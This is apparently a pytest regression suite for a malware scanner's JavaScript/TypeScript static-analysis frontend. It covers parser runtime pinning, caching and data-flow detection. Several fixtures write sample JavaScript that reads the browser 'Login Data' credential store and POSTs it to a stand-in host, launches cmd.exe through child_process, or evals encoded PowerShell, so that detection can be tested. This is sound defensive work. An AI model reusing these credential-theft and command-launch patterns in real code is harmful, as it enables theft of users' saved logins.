"""Phase 23 real JavaScript/TypeScript parser frontend regressions."""
from __future__ import annotations

from contextlib import contextmanager
import hashlib
import json
import os
from pathlib import Path
import shutil
import subprocess

import pytest

from Virus_Scan.contracts.artifact_read_snapshot import build_artifact_read_snapshot
from Virus_Scan.contracts.runtime_platform_identity import runtime_platform_identity
from Virus_Scan.routing.extension_outcome import route_identity_record
from Virus_Scan.routing.extension_scan_router import scan_file_by_type
from Virus_Scan.tests.support.scan_session_fixtures import scan_session_snapshot_fixture
from Virus_Scan.tests.support.native_filesystem_alias import create_native_directory_alias
from Virus_Scan.scanners.static_program_analysis import (
    JAVASCRIPT_TYPESCRIPT_FRONTEND_DIGEST,
    JAVASCRIPT_TYPESCRIPT_FRONTEND_SCHEMA_VERSION,
    JAVASCRIPT_TYPESCRIPT_MAX_SOURCE_BYTES,
    STATIC_PROGRAM_ANALYSIS_FRONTEND_BY_EXTENSION,
    STATIC_PROGRAM_ANALYSIS_FRONTEND_BY_SCANNER_ID,
    STATIC_PROGRAM_ANALYSIS_FRONTENDS,
    TYPESCRIPT_PARSER_VERSION,
    analyze_javascript_typescript_snapshot,
    javascript_typescript_analysis_dependency_digest,
    javascript_typescript_parser_resource_state,
)
from Virus_Scan.scanners.static_program_analysis.typescript_parser_runtime import (
    TYPESCRIPT_NODE_RUNTIME_MANIFEST_SCHEMA_VERSION,
    TYPESCRIPT_NODE_RUNTIME_MANIFEST_SHA256,
    packaged_typescript_node_runtime_state,
)
from Virus_Scan.storage import scan_cache_repository, sqlite_lifecycle


@contextmanager
def _isolated_runtime(tmp_path: Path):
    previous = os.environ.get("UMIGE_BASE_DIR")
    sqlite_lifecycle().close()
    runtime_root = tmp_path / "runtime"
    os.environ["UMIGE_BASE_DIR"] = str(runtime_root)
    try:
        scan_cache_repository().configure(runtime_root / "profiles", enabled=True)
        yield runtime_root
    finally:
        scan_cache_repository().configure(runtime_root / "profiles", enabled=False)
        sqlite_lifecycle().close()
        if previous is None:
            os.environ.pop("UMIGE_BASE_DIR", None)
        else:
            os.environ["UMIGE_BASE_DIR"] = previous


def _analysis(path: Path):
    return analyze_javascript_typescript_snapshot(
        build_artifact_read_snapshot(path)
    ).analysis


def _by_kind(analysis):
    return {
        kind: tuple(sorted(
            (operation for operation in analysis.operations if operation.operation_kind == kind),
            key=lambda operation: operation.control_flow_ordinal,
        ))
        for kind in {operation.operation_kind for operation in analysis.operations}
    }


def _selected_node_manifest_target(resource_root: Path) -> dict[str, object]:
    manifest = json.loads(
        (resource_root / "node_runtime_manifest.json").read_text(encoding="utf-8")
    )
    targets = {
        (item["platform"], item["architecture"], item["abi"]): item
        for item in manifest["targets"]
    }
    assert {
        key: (item["relative_path"], item["sha256"], item["size"])
        for key, item in targets.items()
    } == {
        ("linux", "x86_64", "glibc"): (
            "node_runtime/linux-x86_64/node",
            "8142d37c6f2f372ef040419e7a111a6baf17df89f8078d02447d6c639ae20c1d",
            121_509_208,
        ),
        ("windows", "x86_64", "msvc"): (
            "node_runtime/windows-x86_64/node.exe",
            "c5ff4c736112dd483c750fd4149d30c8a116db1a49b8b3ec88be4b65e6c86c19",
            85_119_640,
        ),
    }
    platform_identity = runtime_platform_identity()
    abi = {
        "linux": "glibc",
        "windows": "msvc",
    }[platform_identity.operating_system]
    return targets[(
        platform_identity.operating_system,
        platform_identity.architecture,
        abi,
    )]


def test_phase23_javascript_typescript_resource_is_packaged_pinned_and_verified() -> None:
    state = javascript_typescript_parser_resource_state()

    assert state.available is True
    assert state.reason == ""
    parser_path = Path(state.parser_path)
    bridge_path = Path(state.bridge_path)
    node_path = Path(state.node_executable)
    resource_root = parser_path.parent
    selected_target = _selected_node_manifest_target(resource_root)
    platform_identity = runtime_platform_identity()
    assert parser_path.is_file()
    assert bridge_path.is_file()
    assert node_path == resource_root / str(selected_target["relative_path"])
    assert node_path.is_file()
    assert not node_path.is_symlink()
    if platform_identity.operating_system == "linux":
        assert os.access(node_path, os.X_OK)
    else:
        assert node_path.name == "node.exe"
    assert TYPESCRIPT_PARSER_VERSION == "5.8.3"
    assert state.node_version == "22.16.0"
    assert state.node_platform == platform_identity.operating_system
    assert state.node_architecture == platform_identity.architecture
    assert state.node_abi == selected_target["abi"]
    assert state.node_sha256 == selected_target["sha256"]
    assert state.node_size == selected_target["size"]
    assert state.runtime_manifest_sha256 == TYPESCRIPT_NODE_RUNTIME_MANIFEST_SHA256
    assert Path(state.runtime_manifest_path) == resource_root / "node_runtime_manifest.json"
    assert len(state.runtime_identity_digest) == 64
    assert len(state.resource_digest) == 64
    assert len(JAVASCRIPT_TYPESCRIPT_FRONTEND_DIGEST) == 64
    assert hashlib.sha256(parser_path.read_bytes()).hexdigest() == (
        "dd17428736a07e1db1a138d8a14295ddb2699ba780ee15038acdd2c6da5373a0"
    )
    assert hashlib.sha256(node_path.read_bytes()).hexdigest() == state.node_sha256
    assert (resource_root / "LICENSE.txt").is_file()
    assert (resource_root / "ThirdPartyNoticeText.txt").is_file()
    completed = subprocess.run(
        (str(node_path), "--version"),
        check=False,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        cwd=str(node_path.parent),
        env={
            "PATH": str(node_path.parent),
            "LANG": "C",
            "LC_ALL": "C",
            "TZ": "UTC",
        },
        timeout=5.0,
    )
    assert completed.returncode == 0
    assert completed.stdout.decode("ascii", "strict").strip() == "v22.16.0"


def _copy_runtime_manifest_support(source_root: Path, target_root: Path) -> None:
    target_root.mkdir(parents=True)
    shutil.copy2(source_root / "node_runtime_manifest.json", target_root)
    runtime = target_root / "node_runtime"
    runtime.mkdir()
    shutil.copy2(source_root / "node_runtime" / "NODE_LICENSE.txt", runtime)
    shutil.copy2(source_root / "node_runtime" / "SHASUMS256.txt", runtime)


def test_phase23_javascript_typescript_packaged_runtime_fails_closed_when_missing(
    tmp_path: Path,
) -> None:
    source_root = Path(javascript_typescript_parser_resource_state().parser_path).parent
    selected_target = _selected_node_manifest_target(source_root)
    isolated = tmp_path / "missing_runtime"
    _copy_runtime_manifest_support(source_root, isolated)

    state = packaged_typescript_node_runtime_state(isolated)

    assert state.available is False
    assert state.reason == "typescript_node_runtime_binary_missing"
    assert state.executable_path == ""
    assert state.executable_sha256 == selected_target["sha256"]
    assert state.executable_size == selected_target["size"]


def test_phase23_javascript_typescript_packaged_runtime_rejects_symlink_substitution(
    tmp_path: Path,
) -> None:
    source_root = Path(javascript_typescript_parser_resource_state().parser_path).parent
    selected_target = _selected_node_manifest_target(source_root)
    isolated = tmp_path / "substituted_runtime"
    _copy_runtime_manifest_support(source_root, isolated)
    binary = isolated / str(selected_target["relative_path"])
    binary.parent.parent.mkdir(parents=True, exist_ok=True)
    outside = tmp_path / "outside_node_runtime"
    outside.mkdir()
    (outside / binary.name).write_bytes((isolated / "node_runtime_manifest.json").read_bytes())
    create_native_directory_alias(binary.parent, outside)

    state = packaged_typescript_node_runtime_state(isolated)

    assert state.available is False
    assert state.reason == "typescript_node_runtime_binary_substituted"
    assert state.executable_path == ""


def test_phase23_javascript_typescript_runtime_has_no_host_discovery_owner() -> None:
    frontend_source = Path(
        "Virus_Scan/scanners/static_program_analysis/javascript_typescript_frontend.py"
    ).read_text(encoding="utf-8")
    runtime_source = Path(
        "Virus_Scan/scanners/static_program_analysis/typescript_parser_runtime.py"
    ).read_text(encoding="utf-8")

    assert "shutil.which" not in frontend_source
    assert "which(" not in runtime_source
    assert "os.environ" not in runtime_source
    assert TYPESCRIPT_NODE_RUNTIME_MANIFEST_SCHEMA_VERSION == (
        "typescript_node_runtime_manifest_v1"
    )


def test_phase23_javascript_typescript_registry_has_one_frontend_owner() -> None:
    expected = (
        "javascript_typescript_static_analysis",
        "powershell_static_analysis",
        "batch_cmd_static_analysis",
        "shell_static_analysis",
        "dotnet_il_static_analysis",
        "native_elf_x86_64_static_analysis",
        "python_renpy_static_analysis",
    )
    assert tuple(item.scanner_id for item in STATIC_PROGRAM_ANALYSIS_FRONTENDS) == expected
    javascript = STATIC_PROGRAM_ANALYSIS_FRONTEND_BY_SCANNER_ID[
        "javascript_typescript_static_analysis"
    ]
    for extension in (".cjs", ".cts", ".js", ".jsx", ".mjs", ".mts", ".ts", ".tsx"):
        assert STATIC_PROGRAM_ANALYSIS_FRONTEND_BY_EXTENSION[extension] is javascript
    assert javascript.frontend_digest == JAVASCRIPT_TYPESCRIPT_FRONTEND_DIGEST
    with pytest.raises(TypeError):
        STATIC_PROGRAM_ANALYSIS_FRONTEND_BY_EXTENSION[".new"] = javascript  # type: ignore[index]


def test_phase23_javascript_comments_and_documentation_strings_do_not_mint_operations(
    tmp_path: Path,
) -> None:
    with _isolated_runtime(tmp_path):
        target = tmp_path / "documentation.js"
        target.write_text(
            "// fs.readFileSync('Browser/Login Data'); fetch('https://x', {method:'POST'});\n"
            "const documentation = `child_process.exec('cmd.exe'); fetch('https://x')`;\n"
            "console.log(documentation);\n",
            encoding="utf-8",
        )

        analysis = _analysis(target)

        assert analysis.parser_status == "complete"
        assert analysis.operations == ()
        assert analysis.flow_edges == ()


def test_phase23_javascript_source_to_sink_flow_uses_real_ast(tmp_path: Path) -> None:
    with _isolated_runtime(tmp_path):
        target = tmp_path / "flow.js"
        target.write_text(
            "const fs = require('fs');\n"
            "const data = fs.readFileSync('Browser/Login Data');\n"
            "fetch('https://example.invalid/upload', {method:'POST', body:data});\n",
            encoding="utf-8",
        )

        analysis = _analysis(target)
        operations = _by_kind(analysis)

        assert analysis.language == "javascript"
        assert operations["file_read"][0].flow_identity.startswith("flow_")
        assert operations["credential_store_discovery"][0].target_resource_identity == operations["file_read"][0].target_resource_identity
        assert dict(operations["credential_store_discovery"][0].resolved_arguments)["resource_family"] == "browser_login_data"
        assert operations["network_send"][0].flow_identity == operations["file_read"][0].flow_identity
        assert operations["network_upload"][0].flow_identity == operations["file_read"][0].flow_identity
        assert operations["network_send"][0].reachability_state == "entrypoint_reachable"
        assert operations["network_upload"][0].reachability_state == "entrypoint_reachable"
        flow_targets = {
            edge.target_operation_id for edge in analysis.flow_edges
            if edge.edge_kind == "source_to_sink"
        }
        assert operations["network_send"][0].operation_id in flow_targets
        assert operations["network_upload"][0].operation_id in flow_targets


def test_phase23_typescript_annotations_import_aliases_and_dead_code_are_structural(
    tmp_path: Path,
) -> None:
    with _isolated_runtime(tmp_path):
        target = tmp_path / "typed.ts"
        target.write_text(
            "import { readFileSync as readOwned } from 'fs';\n"
            "const path: string = 'secret.txt';\n"
            "const data: Buffer = readOwned(path);\n"
            "if (false) { require('child_process').exec('cmd.exe'); }\n",
            encoding="utf-8",
        )

        analysis = _analysis(target)
        operations = _by_kind(analysis)

        assert analysis.language == "typescript"
        assert analysis.language_version == "typescript_5.8.3"
        assert operations["file_read"][0].reachability_state == "entrypoint_reachable"
        assert operations["process_launch"][0].reachability_state == "unreachable"


def test_phase23_javascript_function_reachability_is_not_runtime_occurrence(
    tmp_path: Path,
) -> None:
    with _isolated_runtime(tmp_path):
        target = tmp_path / "functions.js"
        target.write_text(
            "import * as cp from 'child_process';\n"
            "function called() { cp.exec('called.exe'); }\n"
            "function dormant() { cp.exec('dormant.exe'); }\n"
            "called();\n",
            encoding="utf-8",
        )

        operations = _by_kind(_analysis(target))["process_launch"]
        by_target = {operation.resolved_arguments["arguments"][0]: operation for operation in operations}

        assert by_target["called.exe"].reachability_state == "entrypoint_reachable"
        assert by_target["dormant.exe"].reachability_state == "locally_reachable"


def test_phase23_javascript_dynamic_execution_breaks_authoritative_flow(tmp_path: Path) -> None:
    with _isolated_runtime(tmp_path):
        target = tmp_path / "dynamic.js"
        target.write_text(
            "const fs = require('fs');\n"
            "const source = fs.readFileSync('secret.txt');\n"
            "const generated = eval('source');\n"
            "fetch('https://example.invalid', {method:'POST', body:generated});\n",
            encoding="utf-8",
        )

        analysis = _analysis(target)
        operations = _by_kind(analysis)

        assert operations["network_send"][0].flow_identity == ""
        assert "dynamic_execution:eval" in analysis.unresolved_constructs
        assert not any(edge.edge_kind == "source_to_sink" for edge in analysis.flow_edges)


def test_phase23_javascript_multiple_sources_abstain_from_one_sink_flow(tmp_path: Path) -> None:
    with _isolated_runtime(tmp_path):
        target = tmp_path / "ambiguous.js"
        target.write_text(
            "const fs = require('fs');\n"
            "const left = fs.readFileSync('left.txt');\n"
            "const right = fs.readFileSync('right.txt');\n"
            "fetch('https://example.invalid', {method:'POST', body:left + right});\n",
            encoding="utf-8",
        )

        analysis = _analysis(target)
        operations = _by_kind(analysis)

        assert len(operations["file_read"]) == 2
        assert operations["network_send"][0].flow_identity == ""
        assert operations["network_send"][0].resolution_state == "partial"
        assert "ambiguous_source_flow" in operations["network_send"][0].limitations
        assert not any(edge.edge_kind == "source_to_sink" for edge in analysis.flow_edges)



def test_phase23_javascript_generic_method_names_do_not_overclaim_operations(
    tmp_path: Path,
) -> None:
    with _isolated_runtime(tmp_path):
        target = tmp_path / "generic_methods.js"
        target.write_text(
            "const custom = {send(value) {}, query(value) {}, decrypt(value) {}};\n"
            "custom.send('documentation');\n"
            "custom.query('select example');\n"
            "custom.decrypt('example');\n"
            "readFileSync('not imported');\n",
            encoding="utf-8",
        )

        analysis = _analysis(target)

        assert analysis.operations == ()
        assert analysis.flow_edges == ()


def test_phase23_javascript_future_commonjs_alias_does_not_leak_into_function(
    tmp_path: Path,
) -> None:
    with _isolated_runtime(tmp_path):
        target = tmp_path / "future_alias.js"
        target.write_text(
            "function launch() { cp.exec('cmd.exe'); }\n"
            "launch();\n"
            "const cp = require('child_process');\n",
            encoding="utf-8",
        )

        analysis = _analysis(target)

        assert analysis.operations == ()


def test_phase23_javascript_dynamic_import_is_explicitly_unresolved(tmp_path: Path) -> None:
    with _isolated_runtime(tmp_path):
        target = tmp_path / "dynamic_import.js"
        target.write_text("const moduleValue = import(variableName);\n", encoding="utf-8")

        analysis = _analysis(target)

        assert analysis.operations == ()
        assert "dynamic_import" in analysis.unresolved_constructs

def test_phase23_javascript_cache_is_exact_and_failed_results_are_not_reused(
    tmp_path: Path,
) -> None:
    with _isolated_runtime(tmp_path):
        good = tmp_path / "good.ts"
        good.write_text("const value: string = 'safe';\n", encoding="utf-8")
        snapshot = build_artifact_read_snapshot(good)
        first = analyze_javascript_typescript_snapshot(snapshot)
        second = analyze_javascript_typescript_snapshot(snapshot)

        assert first.cache_source == "computed"
        assert second.cache_source == "sqlite_cache"
        assert first.analysis.semantic_digest == second.analysis.semantic_digest
        assert first.analysis.parser_schema_version == JAVASCRIPT_TYPESCRIPT_FRONTEND_SCHEMA_VERSION
        assert first.analysis.parser_digest == JAVASCRIPT_TYPESCRIPT_FRONTEND_DIGEST

        bad = tmp_path / "bad.js"
        bad.write_text("if (\n", encoding="utf-8")
        bad_snapshot = build_artifact_read_snapshot(bad)
        bad_first = analyze_javascript_typescript_snapshot(bad_snapshot)
        bad_second = analyze_javascript_typescript_snapshot(bad_snapshot)

        assert bad_first.analysis.parser_status == "failed"
        assert bad_first.cache_source == "computed"
        assert bad_second.cache_source == "computed"
        assert scan_cache_repository().get_static_analysis(
            content_sha256=bad_snapshot.content_sha256,
            analysis_dependency_digest=javascript_typescript_analysis_dependency_digest(".js"),
        ) is None


def test_phase23_javascript_utf16_and_size_bounds_fail_closed(tmp_path: Path) -> None:
    with _isolated_runtime(tmp_path):
        utf16 = tmp_path / "utf16.js"
        utf16.write_bytes("const value = 'safe';\n".encode("utf-16"))
        assert _analysis(utf16).parser_status == "complete"

        large = tmp_path / "large.js"
        large.write_bytes(b"x" * (JAVASCRIPT_TYPESCRIPT_MAX_SOURCE_BYTES + 1))
        analysis = _analysis(large)
        assert analysis.parser_status == "truncated"
        assert analysis.integrity_status == "partial"
        assert "source_size_limit_exceeded" in analysis.limitations


def test_phase23_javascript_router_preserves_lexical_fallback_and_scope(tmp_path: Path) -> None:
    with _isolated_runtime(tmp_path):
        target = tmp_path / "route.js"
        target.write_text(
            "const fs=require('fs'); const data=fs.readFileSync('secret.txt'); "
            "fetch('https://example.invalid',{method:'POST',body:data});\n",
            encoding="utf-8",
        )
        outcome = scan_file_by_type(
            str(target),
            scan_session_snapshot=scan_session_snapshot_fixture(),
            artifact_read_snapshot=build_artifact_read_snapshot(target),
        )
        identity = route_identity_record(outcome.identity)

        assert identity is not None
        summary = identity["static_program_analysis"]
        assert summary["scanner_id"] == "javascript_typescript_static_analysis"
        assert summary["parser_status"] == "complete"
        decisions = {
            item["scanner_id"]: item
            for item in identity["scanner_execution_plan"]["decisions"]
        }
        assert decisions["javascript_typescript_static_analysis"]["outcome_status"] == "complete_with_observation"
        assert decisions["powershell_static_analysis"]["outcome_status"] == "not_applicable"
        assert decisions["batch_cmd_static_analysis"]["outcome_status"] == "not_applicable"
        assert decisions["python_renpy_static_analysis"]["outcome_status"] == "not_applicable"
        records = tuple(
            record for record in outcome.tag_evidence.records
            if record.source_detector == "javascript_typescript_static_analysis"
        )
        assert records
        assert all(record.modality == "static_control_flow" for record in records)

        malformed = tmp_path / "malformed.js"
        malformed.write_text("eval('powershell -enc AAA'); if (\n", encoding="utf-8")
        malformed_outcome = scan_file_by_type(
            str(malformed),
            scan_session_snapshot=scan_session_snapshot_fixture(),
            artifact_read_snapshot=build_artifact_read_snapshot(malformed),
        )
        malformed_identity = route_identity_record(malformed_outcome.identity)
        assert malformed_identity is not None
        assert malformed_identity["static_program_analysis"]["parser_status"] == "failed"
        assert "powershell_exec" in malformed_outcome.tags
        assert "encoded_powershell" in malformed_outcome.tags


def test_phase23_javascript_physical_records_contain_no_attack_or_probability_authority(
    tmp_path: Path,
) -> None:
    with _isolated_runtime(tmp_path):
        target = tmp_path / "scope.ts"
        target.write_text("require('child_process').exec('cmd.exe');\n", encoding="utf-8")
        text = json.dumps(_analysis(target).to_record(), sort_keys=True).casefold()

        assert "attack_technique" not in text
        assert "p_mitre" not in text
        assert "runtime_occurrence" not in text
        assert "execution_observed" not in text
